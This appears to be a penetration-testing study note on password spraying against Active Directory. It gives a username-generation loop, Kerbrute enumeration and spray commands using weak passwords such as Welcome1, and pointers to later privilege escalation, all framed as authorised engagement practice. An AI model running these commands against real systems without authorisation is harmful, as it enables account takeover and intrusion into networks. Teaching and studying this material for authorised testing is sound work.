# Password Spraying: Technique Overview and Considerations

## Overview

Password spraying is a credential-based attack method used to gain unauthorized access to systems, often serving as an initial foothold into a target network. Unlike brute-force attacks, which attempt multiple passwords against a single user, password spraying tests a single commonly-used password across a wide list of potential usernames. This technique helps avoid account lockouts and is particularly effective in time-boxed penetration testing engagements.

## Attack Context

- **Use Case**: Typically used during early stages of internal or external penetration tests.
- **Username Source**: OSINT (LinkedIn, PDF metadata), common username lists.
- **Password Selection**: Common, weak, or default passwords (e.g., `Welcome1`, `Passw0rd`, `Winter2022`).
- **Execution Goal**: Identify valid credentials for lateral movement or privilege escalation.

---

## Attack Process

### Step 1: Building the Target Username List

**Sources**:

- Publicly available documents (PDF metadata)
- LinkedIn and other social media
- GitHub repositories (e.g., `statistically-likely-usernames`)

**Example Command (Username Generation - GUID Pattern)**:

_Run on Attacker Machine_

```Shell
#!/bin/bash
for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
do echo $x;
done
```

### Step 2: Validating Usernames with Kerbrute

**Command**:

_Run on Attacker Machine_

```Shell
kerbrute userenum --dc <domain_controller_ip> -d <domain> usernames.txt
```

### Step 3: Executing the Password Spray

**Command**:

_Run on Attacker Machine_

```Shell
kerbrute passwordspray --dc <domain_controller_ip> -d <domain> usernames.txt --password Welcome1
```

**Spray Pattern Example**:

|Attempt|Username|Password|
|---|---|---|
|1|bob.smith@inlanefreight.local|Welcome1|
|1|john.doe@inlanefreight.local|Welcome1|
|1|jane.doe@inlanefreight.local|Welcome1|
|Delay|||
|2|bob.smith@inlanefreight.local|Passw0rd|
|2|john.doe@inlanefreight.local|Passw0rd|
|2|jane.doe@inlanefreight.local|Passw0rd|

### Step 4: Post-Access Activities

- Run enumeration tools (e.g., BloodHound) with valid low-privileged access.
- Follow up with techniques like Resource-Based Constrained Delegation (RBCD) or Shadow Credentials to escalate privileges.

## Considerations and Best Practices

- **Avoid Account Lockouts**: Introduce sufficient delays between attempts.
- **Password Policy Awareness**:
    - Common: 5 failed attempts with 30-minute lockout.
    - Check domain policy via internal access or ask client if unknown.
- **Safe Execution**:
    - Spread attempts over several hours.
    - Prefer targeted, single-password tests when risk of detection or lockout is high.

## Summary

Password spraying remains a practical and stealthy technique for initial access when used with carefully curated username lists and common passwords. Its effectiveness increases significantly when combined with OSINT and internal enumeration tools. Proper timing and adherence to password policy constraints are essential to avoid detection and maintain engagement integrity.

---